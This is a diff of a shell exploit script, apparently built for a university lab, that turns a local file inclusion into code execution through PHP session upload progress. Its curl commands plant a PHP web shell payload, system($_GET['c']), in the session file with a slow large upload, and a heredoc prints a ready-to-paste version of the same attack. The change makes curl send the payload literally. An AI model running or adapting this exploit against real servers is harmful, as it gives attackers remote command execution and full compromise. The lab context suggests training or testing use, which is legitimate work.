@@ -135,7 +135,7 @@ entry_b_run() {
   # recién entonces se pide el LFI: no se compite por el worker de Apache.
   curl -sk --max-time 180 --limit-rate 128k \
     -b "PHPSESSID=${sid}" \
-    -F "PHP_SESSION_UPLOAD_PROGRESS=${payload}" \
+    --form-string "PHP_SESSION_UPLOAD_PROGRESS=${payload}" \
     -F "payload=@${bigfile};filename=payload.bin" \
     "${M1_URL%/}/lab/session.php" -o /dev/null &
   bigpid=$!
@@ -217,7 +217,7 @@ cat <<EOF
   SID=\${SID:-lab\$(date -u +%s)}
   head -c 8388608 /dev/zero > /tmp/lab-upload.bin
   curl -sk --limit-rate 128k -b "PHPSESSID=\$SID" \\
-    -F 'PHP_SESSION_UPLOAD_PROGRESS=<?php echo "LAB-PWN"; system(\$_GET["c"]); ?>' \\
+    --form-string 'PHP_SESSION_UPLOAD_PROGRESS=<?php echo "LAB-PWN"; system(\$_GET["c"]); ?>' \\
     -F 'payload=@/tmp/lab-upload.bin;filename=payload.bin' \\
     https://wp.uni.lab/lab/session.php &
 
